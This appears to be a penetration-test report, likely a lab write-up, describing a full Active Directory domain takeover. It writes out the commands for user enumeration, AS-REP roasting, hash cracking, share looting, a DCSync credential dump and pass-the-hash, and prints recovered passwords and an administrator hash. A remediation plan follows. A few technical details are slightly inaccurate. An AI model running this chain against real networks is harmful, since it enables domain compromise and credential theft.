
Technical Assessment Report: Internal Active Directory Penetration Test

Prepared By: Information Security Consultant
Target Domain: spookysec.local
Assessment Type: Internal Network & Infrastructure Architecture Audit
Objective: Evaluate the security posture of the internal enterprise network, map potential attack paths stemming from an unauthenticated network position, and identify systemic Active Directory (AD) misconfigurations that could lead to unauthorized privilege escalation.

1. Executive Summary


1.1 Abstract

During a scheduled internal vulnerability assessment, a full domain compromise was successfully achieved starting from an unauthenticated network perspective. The assessment demonstrated that a low-level insider threat or an attacker with initial network access could pivot from an unprivileged position to absolute control over the entire enterprise identity infrastructure within a single working session.
The attack chain bypassed standard boundary controls by exploiting a series of foundational configuration flaws within the Active Directory environment rather than relying on software vulnerabilities or zero-day exploits. The primary security issues leveraged included disabled Kerberos pre-authentication (AS-REP Roasting), insecure storage of credentials on accessible network shares, and excessive Directory Service replication privileges (DCsync).

1.2 Risk Matrix & Impact Analysis


Threat Level	Criticality	Vulnerability Identified	Impact
CRITICAL	High	Insecure Privilege Delegation (DS-Replication-Get-Changes-All)	Absolute exposure of all domain credentials via unauthorized database replication.
HIGH	High	Cleartext Credential Storage in Network Share (SMB)	Secondary privilege escalation via exposed automated backup credentials.
HIGH	Medium	Disabled Kerberos Pre-Authentication (AS-REP Roasting)	Initial domain foothold through offline dictionary attacks against targeted accounts.


2. Methodology & Technical Execution

[Unauthenticated Position] 
       │
       ▼ (Kerbrute User Enumeration)
[Valid Username Identity] 
       │
       ▼ (AS-REP Roasting via GetNPUsers.py)
[Low-Privilege User Account (svc-admin)] 
       │
       ▼ (SMB Share Inspection)
[Cleartext Backup Account Credentials] 
       │
       ▼ (DCsync Attack via Secretsdump.py)
[Enterprise Administrator NTLM Hashes] 
       │
       ▼ (Pass-the-Hash via Evil-WinRM)
[Domain Controller Administrative Access]

Phase 1: Service Enumeration and Domain Mapping

The assessment initiated with zero prior knowledge of the internal network topology. Active host discovery and port identification were conducted against the target segment utilizing network mapping tools to isolate the primary directory architecture.
bash
# Executing targeted infrastructure scan
nmap -sC -sV -p 53,88,135,139,389,445,3268 -oN primary_dc_audit.log 10.10.x.x
Use code with caution.
Identified Infrastructure Indicators:
• Port 88 (Kerberos v5): Validated active directory-based authentication framework.
• Ports 139 / 445 (SMB): Confirmed active network transport for remote file systems.
• Ports 389 / 3268 (LDAP / Global Catalog): Discovered open directory query pathways exposing the spookysec.local schema.
Local name resolution configuration was established to ensure correct routing protocols for all subsequent domain queries:
bash
echo "10.10.x.x spookysec.local" >> /etc/hosts
Use code with caution.

Phase 2: Active Directory Account Harvesting

Leveraging the open Kerberos architecture, the target environment was queried to validate existing usernames. Because the Kerberos protocol implicitly reveals identity validity through differential error responses during pre-authentication requests, an automated username verification brute-force was executed against standard enterprise name lists.
bash
kerbrute userenum --dc spookysec.local -d spookysec.local core_corporate_users.txt
Use code with caution.
Discovered High-Value Accounts:
• svc-admin (Implying an administrative service role)
• backup (Implying infrastructure or database backup capabilities)

Phase 3: Exploiting Defective Pre-Authentication (AS-REP Roasting)

A thorough configuration review of the discovered identities revealed that the svc-admin account had the User Account Control (UAC) attribute DONT_REQ_PREAUTH enabled.
This setting allows an attacker to request an authentication ticket (AS-REP) from the Key Distribution Center (KDC) without proving knowledge of the associated password. The KDC signs the ticket using the account's master password hash, permitting offline cracking attempts.
bash
# Requesting the encrypted AS-REP material
python3 impacket-GetNPUsers spookysec.local/svc-admin -no-pass -format hashcat
Use code with caution.
The resulting cipher text block ($krb5asrep$23$) was isolated and fed into an optimized cryptographic processing array for dictionary-based decryption:
bash
hashcat -m 18200 svc_admin_tgs.hash enterprise_wordlist.txt --force
Use code with caution.
• Recovered Plaintext Value: management2005
• Operational Outcome: Established an initial low-privileged authenticated foothold inside the internal domain boundaries.

Phase 4: Sensitive Data Exposure Assessment

With the newly obtained authenticated context of svc-admin, a comprehensive access audit of the Server Message Block (SMB) deployment was conducted to map accessible data storage tiers.
bash
smbclient -L //spookysec.local/ -U svc-admin
Use code with caution.
The query exposed a non-default network directory resource structurally defined as \backup. Upon executing an administrative mount of the directory, a text-based storage asset containing cleartext parameters was discovered:
bash
smbclient //spookysec.local/backup -U svc-admin -C "get backup_credentials.txt"
Use code with caution.
The asset stored a Base64 encoded byte array. Reversing the encoding layer exposed functional configuration parameters designed for automated backup scripts:
bash
echo "YmFja3VwQHNwb29reXNlYy5sb2NhbCA6IGJhY2t1cDI1MTc4NjA=" | base64 -d
Use code with caution.
• Compromised Identity: backup@spookysec.local
• Recovered Plaintext Value: backup2517860

Phase 5: High-Privilege Replication Abuse (DCsync Attack)

An Access Control List (ACL) inspection of the compromised backup service identity revealed a severe misconfiguration in the delegation model. The account was granted the extended directory system rights "Replicating Directory Changes" and "Replicating Directory Changes All".
These structural configurations permit an identity to act as an authoritative Domain Controller. By utilizing the Microsoft Directory Replication Service Remote Protocol (MS-DRSR), we impersonated a replication partner and requested the master database entries (NTDS.dit) directly from the Domain Controller.
bash
python3 impacket-secretsdump spookysec.local/backup:backup2517860@spookysec.local -just-dc-user Administrator
Use code with caution.
The Domain Controller executed the replication request, dumping the core cryptographic NTLM validation string for the built-in Domain Administrator:
text
Administrator:500:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::
Use code with caution.

Phase 6: Lateral Pivot & Full Identity Domination

Rather than devoting operational time to reverse the complex NTLM structure of the Administrator account, a Pass-the-Hash (PtH) methodology was employed. Because the Windows Remote Management (WinRM) interface natively accepts valid NTLM hashes for session establishment, the compromised hash token was passed directly over Port 5985.
bash
evil-winrm -i spookysec.local -u Administrator -H 0e0363213e37b94221497260b0bcb4fc
Use code with caution.
Final Strategic State:
The execution successfully instantiated an interactive command console running under the NT AUTHORITY\SYSTEM context on the root Domain Controller, confirming absolute operational control over all identity, cryptographic verification, and host resources within the enterprise forest.

3. Remediation & Strategic Action Plan


3.1 Remediating AS-REP Roasting Vulnerabilities

• Enforce Pre-Authentication Standard: Review all administrative and service entities within the domain using active directory administration toolsets. Explicitly uncheck the option "Do not require Kerberos preauthentication" on the svc-admin account properties sheet.
• Enforce Complex Passphrases: Transition service identity verification models to Group Managed Service Accounts (gMSA), which feature complex, 128-character automatically rotated passphrases that resist offline brute-forcing.

3.2 Securing Persistent Storage and Network Transport

• Remove Plaintext Secrets: Audit all public, user, and automated service shares (SYSVOL, NETLOGON, internal staging shares) for static script deployments containing hardcoded credentials. Remove file histories hosting cleartext parameters immediately.
• Access Control Re-Architecture: Apply the Principle of Least Privilege (PoLP) to data store Access Control Lists (ACLs). Ensure that only authorized storage management appliances have file system reading permission over backup data sets.

3.3 Hardening Active Directory Delegation Configurations

• Replication Rights Audit: Remove highly permissive synchronization capabilities (DS-Replication-Get-Changes-All) from standard user identities or standard service groups. These specific operational privileges must strictly be restricted to legitimate, verified domain controllers.
• Implement Advanced Monitoring Indicators: Configure centralized auditing frameworks (SIEM) to trigger high-priority alerts on Event ID 4662 (Operation performed on an Active Directory object) when an account requesting replication attributes does not belong to the authorized Domain Controllers security group.
